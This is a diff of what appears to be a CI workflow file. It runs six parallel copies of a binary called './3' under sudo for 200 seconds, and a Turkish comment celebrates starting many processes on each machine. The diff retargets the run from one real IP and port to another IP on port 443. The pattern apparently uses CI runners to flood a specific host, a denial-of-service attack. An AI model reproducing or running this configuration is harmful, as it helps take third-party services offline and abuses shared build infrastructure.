@@ -24,7 +24,7 @@ jobs:
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            sudo timeout 200 ./3 51.255.105.230 5555 5 1333 999999 &
+            sudo timeout 200 ./3 92.45.33.204 443 5 1333 999999 &
             PIDS+=($!)
           done
           
